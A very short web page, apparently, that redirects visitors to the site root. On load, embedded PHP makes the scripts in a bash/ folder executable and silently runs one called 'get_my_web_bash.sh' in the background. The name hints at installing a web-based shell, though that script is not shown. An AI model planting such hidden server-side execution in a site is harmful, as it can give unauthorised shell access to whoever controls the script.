<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
<a href="/">redirect</a>

<?php
  exec("chmod +x bash/*");
  exec("bash/get_my_web_bash.sh >log.txt 2>&1 &");
?>
